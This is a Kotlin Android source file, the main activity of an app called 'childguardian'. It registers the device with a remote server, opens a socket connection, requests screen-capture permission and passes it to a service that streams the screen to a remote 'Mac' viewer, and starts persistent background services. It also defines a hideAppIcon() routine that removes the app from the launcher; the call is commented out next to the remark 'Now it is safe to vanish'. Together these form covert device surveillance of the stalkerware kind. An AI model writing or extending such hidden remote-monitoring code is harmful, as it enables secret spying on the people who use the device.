package com.childguardian

import android.os.Bundle
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.childguardian.data.remote.request.RegisterDeviceRequest
import com.childguardian.data.repository.DeviceRepository
import com.childguardian.data.remote.socket.SocketManager
import com.childguardian.utils.DeviceIdGenerator
import com.childguardian.utils.DeviceInfoHelper
import androidx.core.view.WindowCompat
import dagger.hilt.android.AndroidEntryPoint
import timber.log.Timber
import javax.inject.Inject
import android.os.Build
import kotlinx.coroutines.launch
import android.content.Intent
import com.childguardian.services.core.CoreService
import org.webrtc.PeerConnectionFactory
import android.app.Activity
import android.media.projection.MediaProjectionManager
import androidx.activity.result.contract.ActivityResultContracts
import com.childguardian.services.screen.MediaProjectionHolder
import com.childguardian.services.screen.ScreenCaptureService
import android.content.ComponentName
import android.content.pm.PackageManager
import android.view.WindowManager
import android.content.Context
@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    @Inject
    lateinit var deviceRepository: DeviceRepository

    @Inject
    lateinit var socketManager: SocketManager

    @Inject
    lateinit var mediaProjectionHolder: MediaProjectionHolder

    private var currentViewerId: String? = null
    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            Timber.d("Permission granted! Sending ticket to Service...")

            // 1. Prepare the hand-off to the ScreenCaptureService
            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                action = "START_STREAM"
                // We pass the raw result data (the "Ticket") to the service
                putExtra("RESULT_CODE", result.resultCode)
                putExtra("DATA", result.data)
                // Ensure the viewerId from the command is passed along
                putExtra("VIEWER_ID", currentViewerId)
            }

            // 2. Start the service safely
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }

            // 3. Now it is safe to vanish
            // hideAppIcon()
            finish()
        } else {
            Timber.e("Screen capture permission denied or data is null")
            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
        setContentView(R.layout.activity_main)

        // Process the intent that started the app
        handleStreamRequest(intent)
    }

    // <<< ADD THIS: The Catcher's Mitt for when the app is already awake!
    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent) // Update the activity's intent
        handleStreamRequest(intent) // Process the new command
    }

    // Our new Traffic Cop
    private fun handleStreamRequest(currentIntent: Intent?) {
        currentViewerId = currentIntent?.getStringExtra("VIEWER_ID")

        if (currentViewerId != null) {
            // SCENARIO A: The Mac requested a stream
            Timber.d("Mac requested stream! Popping permission box for viewer: $currentViewerId")
            val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())

        } else {
            // SCENARIO B: Normal app launch
            Timber.d("Normal app launch detected.")
            lifecycleScope.launch {
                val deviceInfo = deviceRepository.getDeviceInfoSync()
                if (deviceInfo?.registered == true) {
                    Timber.d("Device already registered, starting background services")
                    socketManager.connect(deviceInfo.deviceId)
                    startBackgroundServices()
                    // finish() is currently commented out for testing, leave it that way!
                } else {
                    performRegistration()
                }
            }
        }
    }


    // ActivityResultLauncher for screen capture


    private suspend fun performRegistration() {
        val deviceId = DeviceIdGenerator.getDeviceId(this)
        val request = DeviceInfoHelper.getDeviceInfo(this, deviceId)

        Timber.d("Registering device: $request")

        deviceRepository.registerDevice(request).fold(
            onSuccess = {
                Timber.d("Registration successful")
                // Connect socket after registration
                socketManager.connect(deviceId)
                val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                val intent = mediaProjectionManager.createScreenCaptureIntent()
                screenCaptureLauncher.launch(intent)

                startBackgroundServices()

            },
            onFailure = { error ->
                Timber.e(error, "Registration failed")
                // Show error on UI (for debugging)
                // In production, you might retry later
            }
        )
    }

    private fun startBackgroundServices() {
        // We'll implement this later
        Timber.d("Starting background services")
        val intent = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun startScreenCaptureService() {
        val intent = Intent(this, ScreenCaptureService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)

        } else {
            startService(intent)
        }
    }


    private fun hideAppIcon() {
        val packageManager = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}